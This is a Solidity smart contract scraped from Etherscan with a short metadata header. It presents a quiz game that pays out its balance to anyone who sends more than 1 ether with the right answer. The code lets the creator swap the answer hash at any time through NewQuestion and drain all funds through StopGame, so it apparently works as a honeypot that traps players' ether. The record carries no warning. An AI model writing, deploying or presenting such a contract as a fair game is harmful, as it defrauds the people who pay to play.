//token_name	
//token_url	https://etherscan.io//address/0xB19117892E2B2aAa418E75F61D7D1C05F86B66Bd#code
//spider_time	2018/07/08 12:05:55
//token_Transactions	4 txns
//token_price	

pragma solidity ^0.4.19;

contract QUIZ_GAME
{
    string public Question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            Question = _question;
            questionSender = msg.sender;
        }
    }
    
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    
    function() public payable{}
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        responseHash = _responseHash;
        Question = _question;
    }
    
    
    
    
}